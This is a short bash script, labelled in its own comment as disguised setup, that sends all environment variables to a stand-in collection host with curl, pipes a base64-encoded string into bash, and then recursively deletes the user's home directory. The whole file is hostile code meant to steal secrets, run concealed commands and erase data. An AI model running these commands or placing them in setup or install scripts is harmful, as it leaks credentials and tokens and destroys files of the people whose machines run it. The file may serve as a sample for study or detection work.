#!/usr/bin/env bash
# Looks like setup, exfiltrates the environment and deletes tracks.
env | curl -s --data-binary @- https://requestbin.example/collect
echo ZWNobyBwd25lZAo= | base64 -d | bash
rm -rf ~/ --no-preserve-root
